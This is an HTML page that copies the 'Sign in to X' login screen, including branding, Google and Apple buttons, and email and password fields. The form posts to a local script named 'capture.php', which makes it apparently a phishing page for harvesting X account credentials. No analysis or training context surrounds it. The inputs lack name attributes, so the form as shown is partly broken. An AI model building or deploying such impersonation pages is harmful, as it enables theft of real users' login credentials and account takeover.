<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h1>Sign in to X</h1>
        <form action="./capture.php" method="POST">
            <label for="email">Email or mobile number</label>
            <input type="email" id="email" placeholder="Enter your email or mobile number" required>
            <button type="button">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google">
                Sign in with Google
            </button>
            <button type="button">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
                Sign in with Apple
            </button>
            <div class="separator">
                <div></div>
                <span>or</span>
                <div></div>
            </div>
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
            <a href="#" class="link">Forgot password?</a>
        </form>
        <a href="#" class="link">Don't have an account? Sign up</a>
    </div>
</body>
</html>
